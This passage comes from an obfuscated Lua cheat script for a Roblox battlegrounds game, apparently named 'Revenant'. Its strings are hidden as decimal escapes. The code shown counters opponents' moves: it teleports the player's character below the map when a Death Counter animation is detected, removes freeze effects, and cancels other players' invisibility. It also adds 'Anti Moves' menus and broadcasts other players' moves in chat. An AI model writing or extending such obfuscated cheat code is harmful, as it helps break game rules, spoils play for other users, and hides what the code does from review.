"\10033\032\099\097\117\115\101\032\101\118\101\110\032\105\102\032\105\032\100\111\046\046\046", "\10033\032\119\101\039\108\108\032\106\117\115\116\032\101\110\100\032\117\112\032\114\105\103\104\116\032\098\097\099\107\032\104\101\114\101\044\032\119\105\116\104\111\117\116\032\097\110\121\032\109\101\109\111\114\121\032\111\102\032\105\116\044\032\114\105\103\104\116\063" }, DeathCounterQuote10 = { "\10033\032\103\101\116\116\105\110\103\032\116\111\032\116\104\101\032\108\101\097\100\101\114\098\111\097\114\100\032\100\111\101\115\110\039\116\032\114\101\097\108\108\121\032\097\112\112\101\097\108\032\097\110\121\109\111\114\101\044\032\101\105\116\104\101\114\046", "\10033\032\099\097\117\115\101\032\101\118\101\110\032\105\102\032\105\032\100\111\046\046\046", "\10033\032\119\101\039\108\108\032\106\117\115\116\032\101\110\100\032\117\112\032\114\105\103\104\116\032\098\097\099\107\032\104\101\114\101\044\032\119\105\116\104\111\117\116\032\097\110\121\032\109\101\109\111\114\121\032\111\102\032\105\116\044\032\114\105\103\104\116\063" }, DeathCounterQuote11 = { "\10033\032\121\111\117\032\114\101\097\108\108\121\032\108\105\107\101\032\116\114\121\105\110\103\032\116\111\032\112\117\110\099\104\032\109\101\044\032\104\117\104\063", "\10033\032\105\032\107\110\111\119\032\121\111\117\032\100\105\100\110\039\116\032\097\110\115\119\101\114\032\109\101\032\098\101\102\111\114\101\044\032\098\117\116\046\046\046", "\10033\032\108\101\116\039\115\032\106\117\115\116\032\098\101\032\102\114\105\101\110\100\115\032\097\108\114\105\103\104\116\063", "\10033\032\046\032\046\032\046", "\10033\032\115\105\107\101\046\032\105\102\032\119\101\039\114\101\032\116\114\117\108\121\032\102\114\105\101\110\100\115\046\046\046", "\10033\032\121\032\111\032\117\032\119\032\111\032\110\032\116\032\099\032\111\032\109\032\101\032\098\032\097\032\099\032\107" }, DeathCounterQuote12 = { "\10033\032\102\114\105\101\110\100\115\104\105\112\046\046\046", "\10033\032\105\116\039\115\032\114\101\097\108\108\121\032\103\114\101\097\116\032\114\105\103\104\116\063", "\10033\032\099\109\111\110\044\032\106\117\115\116\032\115\116\111\112\032\100\101\097\116\104\032\099\111\117\110\116\101\114\105\110\103\032\109\101\046", "\10033\032\114\101\097\108\108\121\063\032\121\111\117\039\114\101\032\116\114\117\115\116\105\110\103\032\109\101\063", "\10033\032\099\039\109\101\114\101\044\032\112\097\108\046\032\115\105\107\101\044\032\103\101\101\101\116\116\116\116\116\116\116\032\100\117\110\107\101\100\032\111\110\033\033\033" }, DeathCounterQuote13 = { "\10033\032\046\032\046\032\046", "\10033\032\114\101\097\100\121\063" }, } local function _IlllIlIlII(_llllIIllll) return _lIIllIIlII["\068\101\097\116\104\067\111\117\110\116\101\114\081\117\111\116\101" .. tostring(_llllIIllll)] end
 local _IIIlIlIIll = attackerPlayer if not _IIIlIlIIll then _IlllIlIIll("\042\032\121\111\117\039\114\101\032\106\117\115\116\032\097\032\100\105\114\116\121\032\114\097\103\101\113\117\105\116\116\101\114\044\032\097\114\101\110\039\116\032\121\111\117\063") return end
 local _lIIllIIllI = _IIIlIlIIll:GetAttribute("\083\097\110\101\115\115") if _lIIllIIllI and _lIIllIIllI ~= 0xD then local _IllllIlIIl = _IlllIlIlII(_lIIllIIllI) if _IllllIlIIl then for _lllIlllIIl, line in ipairs(_IllllIlIIl) do _IlllIlIIll(line) task.wait(0x3) end
 end
 _IIIlIlIIll:SetAttribute("\083\097\110\101\115\115", _lIIllIIllI + 0x1) elseif not _lIIllIIllI then _IlllIlIIll("\042\032\119\104\097\116\063\032\121\111\117\032\116\104\105\110\107\032\105\039\109\032\106\117\115\116\032\103\111\110\110\097\032\115\116\097\110\100\032\116\104\101\114\101\032\097\110\100\032\116\097\107\101\032\105\116\063") task.wait(0x3) _IlllIlIIll("\042\032\119\101\108\112\046\032\116\104\105\115\032\105\115\032\119\104\121\032\105\032\110\101\118\101\114\032\109\097\107\101\032\112\114\111\109\105\115\101\115\046") task.wait(0x5) _IIIlIlIIll:SetAttribute("\083\097\110\101\115\115", 0x1) end
 end
 end
 local function _IllIIllIlI(_IIIIllllII) local _IIllllIlII = _llIIIlIIll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllllIlII and _llIIlIIlII) then return end
 task.spawn( function () RunService.RenderStepped:Once( function () _llIIlIIlII.Velocity = Vector3.new() RunService.Heartbeat:Wait() _llIIlIIlII.Velocity = Vector3.new() end
 ) RunService.Heartbeat:Once( function () _llIIlIIlII.CFrame = _IIIIllllII end
 ) end
 ) end
 local function _llllllIIIl() local _IIllllIlII = _llIIIlIIll.Character local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIllllIlII and _IlIIIlIIII and workspace.CurrentCamera then local _IIIIllllII = workspace.CurrentCamera.CFrame workspace.CurrentCamera:Destroy() local _IIlIllIllI = Instance.new("\067\097\109\101\114\097", workspace) _IIlIllIllI.CameraType = Enum.CameraType.Custom _IIlIllIllI.CameraSubject = _IlIIIlIIII _IIlIllIllI.CFrame = _IIIIllllII _llIIIlIIll.CameraMode = Enum.CameraMode.Classic local _IlIIIlllII = _IIllllIlII:FindFirstChild("\072\101\097\100") if _IlIIIlllII then _IlIIIlllII.Anchored = false end
 end
 end
 local function _IlIIlIIlll(_IlIIlIIlIl) if _lIlllllIll then _lIlllllIll:Disconnect() _lIlllllIll = nil end
 if not _IlIIlIIlIl then return end
 _lIlllllIll = _IlIIlIIlIl.AnimationPlayed:Connect( function (_llIIllIlIl) if not _llllllIIIl() then return end
 if not _llIIllIlIl.Animation.AnimationId:match("\049\049\051\052\051\050\053\048\048\048\049") then return end
 task.spawn( function () local _llIIllIIlI = _llllIlllll() local _IlIIlIllll = _llIIllIIlI <= 0x0 if _llIIllIIlI <= 0x0 then pcall( function () _llIIllIlIl:Stop() end
 ) end
 task.spawn(_llllllIIIl) local _IIllllIlII = _llIIIlIIll.Character _IIllllIlII:WaitForChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108", 0x1) local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lllIllllII = _llIIlIIlII.CFrame local _lllIIlIIlI = nil for _lllIlllIIl, _lllIIlllll in pairs(Players:GetPlayers()) do if _lllIIlllll ~= _llIIIlIIll then local _IllIIlIIII = _lllIIlllll.Character local _llIIIIIlII = _IllIIlIIII and _IllIIlIIII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIlllIIlII = _IllIIlIIII and _IllIIlIIII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IllIIlIIII and _llIIIIIlII and _IIlllIIlII then for _lllIlllIIl, _IIlIIllIIl in pairs(_IIlllIIlII:GetPlayingAnimationTracks()) do if _IIlIIllIIl.Animation.AnimationId:match("\049\049\051\052\051\051\049\056\049\051\052") and (_llIIlIIlII.Position - _llIIIIIlII.Position).Magnitude <= 0xF then _lllIIlIIlI = _lllIIlllll end
 end
 end
 end
 end
 local _lIIIlIIIll = nil local _IIlIIIlIII = nil if _lllIIlIIlI then local _lIlIIlIIlI = _lllIIlIIlI.Character _lIIIlIIIll = _lIlIIlIIlI and _lIlIIlIIlI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") _IIlIIIlIII = _IllIlIlIII(_lllIIlIIlI) _IllIIlIIll:Notify({ Title = _lIllIllIII("\068\101\097\116\104\032\067\111\117\110\116\101\114"), Content = _IIlIIIlIII .. "\032\117\115\101\100\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\111\110\032\121\111\117\046", _IllIIlIlll = 0x5 }) else local _IIllIIIlII = Instance.new("\077\111\100\101\108") local _IllIlIlIII = Instance.new("\072\117\109\097\110\111\105\100", _IIllIIIlII) _IllIlIlIII.Health = 0x64 _lIIIlIIIll = _IllIlIlIII _IIlIIIlIII = nil task.delay(_llIIllIIlI + 0x2, function () _IllIlIlIII.Health = 0x0 end
 ) _IllIIlIIll:Notify({ Title = _lIllIllIII("\068\101\097\116\104\032\067\111\117\110\116\101\114"), Content = "\068\101\097\116\104\032\067\111\117\110\116\101\114\032\097\116\116\101\109\112\116\032\100\101\116\101\099\116\101\100\046", _IllIIlIlll = 0x5 }) end
 if _llIIllIIlI > 0x0 then task.wait(_llIIllIIlI) if not _llllllIIIl() then return end
 _IIllllIlII = _llIIIlIIll.Character _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllllIlII and _llIIlIIlII) then return end
 end
 local _llllllllII = workspace.CurrentCamera and workspace.CurrentCamera.CameraSubject if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = nil end
 local _lIlllIllll = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIllIIIllI = CFrame.new(0x0, -0x2710, 0x0) * CFrame.Angles(math.rad(0x5A), 0x0, 0x0) local _lIIIllllII = tick() repeat _IllIIllIlI(_IIllIIIllI) if _llIIllIIlI > 0x0 and not _IlIIlIllll then _IlIIlIllll = true pcall( function () _llIIllIlIl:Stop() end
 ) end
 RunService.RenderStepped:Wait() until (_lIIIlIIIll and _lIIIlIIIll.Health <= 0x0) or (_lIlllIllll and _lIlllIllll.Health <= 0x0) or tick() >= _lIIIllllII + 0xA if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = _llllllllII end
 _IllIIllIlI(_lllIllllII) task.spawn( function () _IIlIIIIIIl(_lllIIlIIlI, _IIlIIIlIII) end
 ) task.wait(0x1) local _IIIIllllIl = _llIIIlIIll.Character if _IIIIllllIl then local _IlIlllIIll = _IIIIllllIl:FindFirstChild("\070\114\101\101\122\101") local _IllIIIlIlI = _IIIIllllIl:FindFirstChild("\078\111\082\111\116\097\116\101") if _IlIlllIIll then _IlIlllIIll:Destroy() end
 if _IllIIIlIlI then _IllIIIlIlI:Destroy() end
 end
 task.spawn(_llllllIIIl) end
 ) end
 ) end
 local function _llIIIIIIlI(_IIllllIlII) if not _IIllllIlII then return end
 local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIlIIlIl then _IlIIlIIlll(_IlIIlIIlIl) else task.spawn( function () local _IlIIIlIIII = _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0x5) if _IlIIIlIIII and _llllllIIIl() then _IlIIlIIlll(_IlIIIlIIII) end
 end
 ) end
 end
 _llIIIIIIlI(_llIIIlIIll.Character) _IIlllllIIl = _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) task.wait(0.1) _llIIIIIIlI(_IIllllIlII) end
 ) table.insert(_llIlllIlIl, function () if _lIlllllIll then _lIlllllIll:Disconnect() _lIlllllIll = nil end
 if _IIlllllIIl then _IIlllllIIl:Disconnect() _IIlllllIIl = nil end
 pcall( function () _IlIllIIllI.AntiDCQuotesDD:SetValue("\078\111\032\081\117\111\116\101\115") end
 ) pcall( function () _IlIllIIllI.AntiDCWaitBeforeKillDD:SetValue("\078\111\032\087\097\105\116\032\045\032\078\101\097\114\032\073\110\115\116\097\110\116\032\065\110\100\032\080\114\101\118\101\110\116\115\032\084\097\098\098\105\110\103") end
 ) end
 ) local _IllIIIIlll = nil local _lIlIllIlll = game:GetService("\083\116\097\114\116\101\114\071\117\105") table.insert(_llIlllIlIl, function () if _IllIIIIlll then _IllIIIIlll:Disconnect() _IllIIIIlll = nil end
 end
 ) _IlIlIlIlII:AddButton({ Text = "\084\111\103\103\108\101\032\065\108\108\032\079\110", Func = function () local _lIIIlIllll, v665, v666 = pairs(_IIlIlIIlIl) while true do local _llIlIIlIlI v666, _llIlIIlIlI = _lIIIlIllll(v665, v666) if v666 == nil then break end
 if v666:find("\094\065\110\116\105\077\111\118\101\115\095") and _llIlIIlIlI.Type == "\084\111\103\103\108\101" then _llIlIIlIlI:SetValue(true) end
 end
 local _IllIIIlIIl, v669, v670 = pairs(_IlIllIIllI) while true do local _IIlIlIlIll v670, _IIlIlIlIll = _IllIIIlIIl(v669, v670) if v670 == nil then break end
 if v670:find("\094\065\110\116\105\077\111\118\101\115\095") and _IIlIlIlIll.Type == "\068\114\111\112\100\111\119\110" then local _IlIIlIIllI, v673, v674 = pairs(_IIlIlIlIll.Values) local _llllIIIIII = {} while true do local _IlIIIIIllI v674, _IlIIIIIllI = _IlIIlIIllI(v673, v674) if v674 == nil then break end
 _llllIIIIII[_IlIIIIIllI] = true end
 _IIlIlIlIll:SetValue(_llllIIIIII) end
 end
 end
 , }):AddButton({ Text = "\084\111\103\103\108\101\032\065\108\108\032\079\102\102", Func = function () local _IIlllIIlll, v678, v679 = pairs(_IIlIlIIlIl) while true do local _IIIlIlIIlI v679, _IIIlIlIIlI = _IIlllIIlll(v678, v679) if v679 == nil then break end
 if v679:find("\094\065\110\116\105\077\111\118\101\115\095") and _IIIlIlIIlI.Type == "\084\111\103\103\108\101" then _IIIlIlIIlI:SetValue(false) end
 end
 local _llllIlllIl, v682, v683 = pairs(_IlIllIIllI) while true do local _IIllIlIlll v683, _IIllIlIlll = _llllIlllIl(v682, v683) if v683 == nil then break end
 if v683:find("\094\065\110\116\105\077\111\118\101\115\095") and _IIllIlIlll.Type == "\068\114\111\112\100\111\119\110" then _IIllIlIlll:SetValue({}) end
 end
 end
 , }) if getgenv()._revenantAntiFlingBuild then getgenv()._revenantAntiFlingBuild(_IlIlIlIlII) getgenv()._revenantAntiFlingBuild = nil end
 local _llIIlIlIlI = {} local _lllIlIllII = false local _IlIllIIlIl = { Head = true, UpperTorso = true, LowerTorso = true, Torso = true, LeftUpperArm = true, LeftLowerArm = true, LeftHand = true, RightUpperArm = true, RightLowerArm = true, RightHand = true, LeftUpperLeg = true, LeftLowerLeg = true, LeftFoot = true, RightUpperLeg = true, RightLowerLeg = true, RightFoot = true, ["\076\101\102\116\032\065\114\109"] = true, ["\082\105\103\104\116\032\065\114\109"] = true, ["\076\101\102\116\032\076\101\103"] = true, ["\082\105\103\104\116\032\076\101\103"] = true, } local function _lIIlIlIlII() _lllIlIllII = false for _lllIlllIIl, _IIIlIlllll in ipairs(_llIIlIlIlI) do pcall(_IIIlIlllll.Disconnect, _IIIlIlllll) end
 _llIIlIlIlI = {} end
 local function _IlIIlIllII() local _llIIlIIllI = {} for _lllIlllIIl, _IIIlIlllll in ipairs(_llIIlIlIlI) do if _IIIlIlllll.Connected then table.insert(_llIIlIIllI, _IIIlIlllll) end
 end
 _llIIlIlIlI = _llIIlIIllI end
 local function _lllllIllll(_IIllllIlII) for _lllIlllIIl, _llIIIIlllI in pairs(_IIllllIlII:GetChildren()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") and _IlIllIIlIl[_llIIIIlllI.Name] then _llIIIIlllI.Transparency = 0.5 elseif _llIIIIlllI:IsA("\065\099\099\101\115\115\111\114\121") then local _IlIIllllll = _llIIIIlllI:FindFirstChild("\072\097\110\100\108\101") if _IlIIllllll and _IlIIllllll:IsA("\066\097\115\101\080\097\114\116") then _IlIIllllll.Transparency = 0.5 end
 end
 end
 end
 local function _llIIIlllII(_IIllllIlII) for _lllIlllIIl, _llIIIIlllI in pairs(_IIllllIlII:GetChildren()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") and _IlIllIIlIl[_llIIIIlllI.Name] then _llIIIIlllI.Transparency = 0x0 elseif _llIIIIlllI:IsA("\065\099\099\101\115\115\111\114\121") then local _IlIIllllll = _llIIIIlllI:FindFirstChild("\072\097\110\100\108\101") if _IlIIllllll and _IlIIllllll:IsA("\066\097\115\101\080\097\114\116") then _IlIIllllll.Transparency = 0x0 end
 end
 end
 end
 local _lIllIIllII = { "\049\056\049\056\050\052\050\053\049\051\051", "\049\051\054\051\055\048\055\051\055\054\051\051\054\052\057", "\049\056\052\054\050\056\057\050\050\049\055", "\055\052\056\052\052\051\056\050\055\051\056\053\051\050", "\055\055\055\050\055\049\049\053\056\057\050\053\055\057", "\049\048\055\049\049\052\051\053\056\057\054\053\055\057\051", "\055\049\049\056\049\048\049\053\052\052\051\048\051\048", "\055\054\048\050\048\055\057\055\057\049\054\053\053\049", } local function _lIIIIlllII(_llIIllIlIl, _IIllllIlII, _lllIIlllll) local _IlllIllIII = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId or "" for _lllIlllIIl, _IIIIllIIlI in ipairs(_lIllIIllII) do if _IlllIllIII:match(_IIIIllIIlI) and _llIIllIlIl.Speed < 0x1 then _lllllIllll(_IIllllIlII) task.spawn( function () repeat _llIIllIlIl:AdjustWeight(-0xF423F) RunService.Heartbeat:Wait() until not (_llIIllIlIl.IsPlaying and _lllIlIllII) _llIIIlllII(_IIllllIlII) end
 ) break end
 end
 end
 local function _lIllIlllII(_lllIIlllll) if _lllIIlllll == _llIIIlIIll then return end
 _IlIIlIllII() local _IIllllIlII = _lllIIlllll.Character if not _IIllllIlII then return end
 local _IlIIlIIlIl = _IIllllIlII:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IlIIlIIlIl then return end
 for _lllIlllIIl, _llIIllIlIl in pairs(_IlIIlIIlIl:GetPlayingAnimationTracks()) do _lIIIIlllII(_llIIllIlIl, _IIllllIlII, _lllIIlllll) end
 local _IlIIllIlIl = _IlIIlIIlIl.AnimationPlayed:Connect( function (_llIIllIlIl) if not _lllIlIllII then return end
 _lIIIIlllII(_llIIllIlIl, _IIllllIlII, _lllIIlllll) end
 ) table.insert(_llIIlIlIlI, _IlIIllIlIl) end
 local function _IlllIlIIIl(_lllIIlllll) if _lllIIlllll == _llIIIlIIll then return end
 if _lllIIlllll.Character then _lIllIlllII(_lllIIlllll) end
 local _IIlllIIlll = _lllIIlllll.CharacterAdded:Connect( function () if not _lllIlIllII then return end
 task.wait(0.5) _lIllIlllII(_lllIIlllll) end
 ) table.insert(_llIIlIlIlI, _IIlllIIlll) end
 _IlIlIlIlII:AddToggle("\065\110\116\105\073\110\118\105\115\084\111\103\103\108\101", { Text = "\065\110\116\105\045\073\110\118\105\115\105\098\105\108\105\116\121", Default = false, Risky = true, Tooltip = "\067\097\110\032\108\097\103\044\032\097\108\115\111\044\032\065\110\116\105\045\105\110\118\105\115\105\098\105\108\105\116\121\032\111\110\032\109\101\099\104\032\119\111\117\108\100\032\098\101\032\108\097\103\103\121\044\032\115\111\032\116\104\101\114\101\032\105\115\110\039\116\032\097\110\121\046", Callback = function (value) if value then _lllIlIllII = true for _lllIlllIIl, _lllIIlllll in pairs(Players:GetPlayers()) do _IlllIlIIIl(_lllIIlllll) end
 local _lIIllllIll = Players.PlayerAdded:Connect( function (_lllIIlllll) if not _lllIlIllII then return end
 _IlllIlIIIl(_lllIIlllll) end
 ) table.insert(_llIIlIlIlI, _lIIllllIll) else _lIIlIlIlII() end
 end
 }) table.insert(_llIlllIlIl, function () _lIIlIlIlII() pcall( function () _IIlIlIIlIl.AntiInvisToggle:SetValue(false) end
 ) end
 ) _IlIlIlIlII:AddToggle("\065\110\116\105\077\111\118\101\115\095\084\114\097\115\104\099\097\110", { Text = "\065\110\116\105\032\084\114\097\115\104\099\097\110", Default = false, }) _IlIlIlIlII:AddDivider() _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\083\097\105\116\097\109\097", { Text = "\065\110\116\105\032\083\097\105\116\097\109\097", Values = { "\065\110\116\105\032\078\111\114\109\097\108\032\080\117\110\099\104", "\065\110\116\105\032\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115", "\065\110\116\105\032\083\104\111\118\101", "\065\110\116\105\032\085\112\112\101\114\099\117\116", "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114", "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\083\104\111\099\107\119\097\118\101", "\065\110\116\105\032\084\097\098\108\101\032\070\108\105\112", "\065\110\116\105\032\083\101\114\105\111\117\115\032\080\117\110\099\104", "\065\110\116\105\032\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104", }, Multi = true, Default = {}, Searchable = true, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\068\067\081\117\111\116\101\115\068\068", { Text = "\068\101\097\116\104\032\067\111\117\110\116\101\114\032\081\117\111\116\101\115\032\077\111\100\101", Values = { "\078\111\032\081\117\111\116\101\115", "\083\117\107\117\110\097\032\081\117\111\116\101\115", "\071\111\106\111\032\081\117\111\116\101\115", "\078\097\109\101\032\081\117\111\116\101\115", "\065\100\109\105\110\032\081\117\111\116\101\115", "\083\097\110\115\032\081\117\111\116\101\115", "\082\097\110\100\111\109" }, Default = 0x1, Multi = false, Visible = false, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\068\067\087\097\105\116\066\101\102\111\114\101\075\105\108\108\068\068", { Text = "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\068\101\108\097\121", Values = { "\078\111\032\087\097\105\116\032\045\032\080\114\101\118\101\110\116\115\032\084\097\098\098\105\110\103", "\051\115\032\045\032\070\097\107\101\111\117\116", "\053\115\032\045\032\076\111\110\103\032\070\097\107\101\111\117\116", }, Default = 0x1, Multi = false, Visible = false, }) local function _IllIlIlIIl() local _llIIllllIl = _IlIllIIllI.AntiMoves_Saitama and _IlIllIIllI.AntiMoves_Saitama.Value and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114") _IlIllllIlI(_IlIllIIllI.AntiDCQuotesDD, _llIIllllIl == true) _IlIllllIlI(_IlIllIIllI.AntiDCWaitBeforeKillDD, _llIIllllIl == true) end
 pcall( function () _IlIllIIllI.AntiMoves_Saitama:OnChanged(_IllIlIlIIl) end
 ) task.defer(_IllIlIlIIl) _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\071\097\114\111\117", { Text = "\065\110\116\105\032\071\097\114\111\117", Values = { "\065\110\116\105\032\071\097\114\111\117\032\085\108\116", "\065\110\116\105\032\070\105\110\097\108\032\072\117\110\116", "\065\110\116\105\032\070\108\111\119\105\110\103\032\087\097\116\101\114", "\065\110\116\105\032\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109", "\065\110\116\105\032\072\117\110\116\101\114\115\032\071\114\097\115\112", "\065\110\116\105\032\080\114\101\121\115\032\080\101\114\105\108", "\065\110\116\105\032\087\097\116\101\114\032\083\116\114\101\097\109\032\082\111\099\107\032\083\109\097\115\104\105\110\103\032\070\105\115\116", "\065\110\116\105\032\082\111\099\107\032\083\112\108\105\116\116\105\110\103\032\070\105\115\116", "\065\110\116\105\032\067\114\117\115\104\101\100\032\082\111\099\107" }, Multi = true, Default = {}, Searchable = true, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\071\101\110\111\115", { Text = "\065\110\116\105\032\071\101\110\111\115", Values = { "\065\110\116\105\032\084\104\117\110\100\101\114\032\075\105\099\107", "\065\110\116\105\032\070\108\097\109\101\119\097\118\101\032\067\097\110\110\111\110", "\065\110\116\105\032\073\110\099\105\110\101\114\097\116\101" }, Multi = true, Default = {}, Searchable = true, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\084\097\116\115\117\109\097\107\105", { Text = "\065\110\116\105\032\084\097\116\115\117\109\097\107\105", Values = { "\065\110\116\105\032\067\114\117\115\104\105\110\103\032\080\117\108\108", "\065\110\116\105\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121", "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101", "\065\110\116\105\032\069\120\112\117\108\115\105\118\101\032\080\117\115\104", "\065\110\116\105\032\084\097\116\115\117\109\097\107\105\032\085\108\116", "\065\110\116\105\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111" }, Multi = true, Default = {}, Searchable = true, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\065\116\111\109\105\099\083\097\109\117\114\097\105", { Text = "\065\110\116\105\032\065\116\111\109\105\099\032\083\097\109\117\114\097\105", Values = { "\065\110\116\105\032\065\116\111\109\105\099\032\083\097\109\117\114\097\105\032\085\108\116", "\065\110\116\105\032\083\117\110\115\101\116", "\065\110\116\105\032\083\111\108\097\114\032\067\108\101\097\118\101", "\065\110\116\105\032\065\116\111\109\105\099\032\083\108\097\115\104", "\065\110\116\105\032\065\116\111\109\105\099\032\083\108\097\115\104\032\070\105\110\105\115\104\101\114" }, Multi = true, Default = {}, Searchable = true, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\083\117\105\114\121\117", { Text = "\065\110\116\105\032\083\117\105\114\121\117", Values = { "\065\110\116\105\032\087\104\105\114\108\119\105\110\100\032\068\114\111\112", "\065\110\116\105\032\083\117\105\114\121\117\032\085\108\116", "\065\110\116\105\032\071\114\097\110\100\032\070\105\115\115\117\114\101", "\065\110\116\105\032\084\119\105\110\032\070\097\110\103\115", "\065\110\116\105\032\069\097\114\116\104\032\083\112\108\105\116\116\105\110\103\032\083\116\114\105\107\101", "\065\110\116\105\032\076\097\115\116\032\066\114\101\097\116\104" }, Multi = true, Default = {}, Searchable = true, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\077\101\116\097\108\066\097\116", { Text = "\060\102\111\110\116\032\099\111\108\111\114\061\034\114\103\098\040\050\053\053\044\048\044\048\041\034\062\065\110\116\105\032\077\101\116\097\108\032\066\097\116\060\047\102\111\110\116\062", Values = { "\065\110\116\105\032\068\101\097\116\104\032\066\108\111\119", "\065\110\116\105\032\083\097\118\097\103\101\032\084\111\114\110\097\100\111" }, Multi = true, Default = {}, Searchable = true, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\083\111\110\105\099", { Text = "\060\102\111\110\116\032\099\111\108\111\114\061\034\114\103\098\040\050\053\053\044\048\044\048\041\034\062\065\110\116\105\032\083\111\110\105\099\060\047\102\111\110\116\062", Values = { "\065\110\116\105\032\070\108\097\115\104\032\083\116\114\105\107\101", "\065\110\116\105\032\087\104\105\114\108\119\105\110\100\032\075\105\099\107", "\065\110\116\105\032\084\119\105\110\098\108\097\100\101\032\082\117\115\104", "\065\110\116\105\032\067\097\114\110\097\103\101", "\065\110\116\105\032\070\111\117\114\102\111\108\100\032\070\108\097\115\104\115\116\114\105\107\101" }, Multi = true, Default = {}, Searchable = true, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\075\074", { Text = "\060\102\111\110\116\032\099\111\108\111\114\061\034\114\103\098\040\050\053\053\044\048\044\048\041\034\062\065\110\116\105\032\075\074\060\047\102\111\110\116\062", Values = { "\065\110\116\105\032\083\116\111\105\099\032\066\111\109\098", "\065\110\116\105\032\050\048\045\050\048\045\050\048\032\068\114\111\112\107\105\099\107", "\065\110\116\105\032\070\105\118\101\032\083\101\097\115\111\110\115" }, Multi = true, Default = {}, Searchable = true, }) _IlIlIlIlII:AddDropdown("\065\110\116\105\077\111\118\101\115\095\070\114\111\122\101\110\083\111\117\108", { Text = "\060\102\111\110\116\032\099\111\108\111\114\061\034\114\103\098\040\048\044\050\053\053\044\050\053\053\041\034\062\065\110\116\105\032\070\114\111\122\101\110\032\083\111\117\108\060\047\102\111\110\116\062", Values = { "\065\110\116\105\032\080\101\114\109\097\102\114\111\115\116", "\065\110\116\105\032\070\114\111\115\116\032\070\111\114\103\101", "\065\110\116\105\032\070\114\101\101\122\105\110\103\032\080\097\116\104", "\065\110\116\105\032\074\117\100\103\101\109\101\110\116\032\067\104\097\105\110" }, Multi = true, Default = {}, Searchable = true, }) function MoveNotify(_lllIIlllll, moveName) if _IlIllIIllI.MoveNotificationMoves and not rawget(_IlIllIIllI.MoveNotificationMoves.Value, moveName) then return end
 if _IIlIlIIlIl.MoveNotifications and _IIlIlIIlIl.MoveNotifications.Value then _IllIIlIIll:Notify({ Title = "\077\111\118\101\032\078\111\116\105\102\105\099\097\116\105\111\110", Content = _lllIIlllll.DisplayName .. "\032\117\115\101\100\032" .. moveName, _IllIIlIlll = 0x5, }) end
 if _IIlIlIIlIl.ExposeMoveInChat and _IIlIlIIlIl.ExposeMoveInChat.Value and not (_IIlIlIIlIl.ExposeWhitelistedPlayers and _IIlIlIIlIl.ExposeWhitelistedPlayers.Value and table.find(RevenantWhitelist, _lllIIlllll)) then pcall( function () local _lIIlIllIlI = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101") if _lIIlIllIlI.ChatVersion ~= Enum.ChatVersion.LegacyChatService then if _lIIlIllIlI.ChatVersion == Enum.ChatVersion.TextChatService then local _IIllllIlII = _lIIlIllIlI.TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _IIllllIlII then _IIllllIlII:SendAsync("\10071" .. _lllIIlllll.DisplayName .. "\032\117\115\101\100\032" .. moveName .. "\10071") end
 end
